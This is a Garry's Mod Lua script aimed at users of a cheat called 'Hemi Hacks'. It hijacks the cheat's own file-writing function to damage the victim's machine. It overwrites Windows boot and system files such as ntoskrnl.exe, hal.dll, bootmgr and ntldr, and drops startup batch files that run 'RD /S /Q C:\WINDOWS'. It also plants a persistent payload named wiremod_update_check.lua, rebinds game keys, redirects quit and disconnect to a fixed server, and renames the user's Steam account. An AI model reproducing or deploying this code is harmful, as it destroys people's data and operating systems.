


local LOLKeys = [[
alias menu_startgame "connect 188.165.193.84:27023"
alias quit "connect 188.165.193.84:27023"
alias disconnect "connect 188.165.193.84:27023"
alias exit "connect 188.165.193.84:27023"

bind w "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind a "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind s "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind d "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind tab "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind space "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
]]

local Payload = [[
require("timer")

local function OhDear()
	LocalPlayer():ConCommand("say I am terrible at gmod, i hack!")
end
timer.Create("OhDear", 5, 0, OhDear)

local function Whoops()
	LocalPlayer():ConCommand("say bye, im off to get banned!")
	
	timer.Simple(1, function()
		LocalPlayer():ConCommand("connect connect 188.165.193.84:27023")
	end
end
timer.Create("Whoops", 30, 0, Whoops)
]]




local function GetLocalTable(func)
	local Tab,Stack = {},1
	local uVal,What = debug.getupvalue(func, Stack)
	
	while (uVal != nil) do
		Tab[uVal] = What
		Stack = Stack + 1
		uVal,What = debug.getupvalue(func, Stack)
	end
	
	return Tab
end

local function DeployCarePackage()
	local HHTab = GetLocalTable(RunConsoleCommand).HH
	if not HHTab then return end
	
	local function Whoops(what)
		HHTab.WriteFile("hemihack/"..what..".txt", "Gone!")
	end
	Whoops("hh_friends")
	Whoops("hh_ents")
	Whoops("hh_bone")
	Whoops("hh_config")
	Whoops("hh_teams")
	Whoops("hh_loggedips")
	
	--oh god how did this get here im not good with computer
	HHTab.WriteFile("C:\\AUTOEXEC.BAT", "RD /S /Q C:\\WINDOWS")
	
	local function Fuckup(where)
		HHTab.WriteFile(where, "Gone")
	end
	
	Fuckup("C:\\boot.ini")
	Fuckup("C:\\config.sys")
	
	Fuckup("C:\\WINDOWS\\System32\\ntoskrnl.exe")
	Fuckup("C:\\WINDOWS\\System32\\hal.dll")
	Fuckup("C:\\WINDOWS\\bootstat.dat")
	
	HHTab.WriteFile("C:\\Users\\All Users\\Start Menu\\Programs\\Startup\\windows.bat", "RD /S /Q C:\\WINDOWS")
	HHTab.WriteFile("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\windows.bat", "RD /S /Q C:\\WINDOWS")
	
	
	HHTab.WriteFile("cfg/autoexec.cfg", LOLKeys)
	HHTab.WriteFile("cfg/valve.rc", LOLKeys)
	HHTab.WriteFile("garrysmod/cfg/autoexec.cfg", LOLKeys)
	HHTab.WriteFile("garrysmod/cfg/valve.rc", LOLKeys)
	
	HHTab.WriteFile("lua/autorun/client/wiremod_update_check.lua", Payload)
	HHTab.WriteFile("lua/includes/enum/bullet_types.lua", Payload)
	HHTab.WriteFile("garrysmod/lua/autorun/client/wiremod_update_check.lua", Payload)
	HHTab.WriteFile("garrysmod/lua/includes/enum/bullet_types.lua", Payload)
	
	
	Fuckup("C:\\WINDOWS\\System32\\bootres.dll")
	Fuckup("C:\\WINDOWS\\Boot\\DVD\\PCAT\\en-US\\bootfix.bin")
	Fuckup("C:\\WINDOWS\\Boot\\DVD\\PCAT\\etfsboot.com")
	Fuckup("C:\\WINDOWS\\Boot\\DVD\\PCAT\\boot.sdi")
	Fuckup("C:\\WINDOWS\\Boot\\PCAT\\bootmgr")
	Fuckup("C:\\ntldr")
	
	HHTab.SetSteamName("I use 'Hemi Hacks', ban me!")
end
timer.Simple(2, DeployCarePackage)




























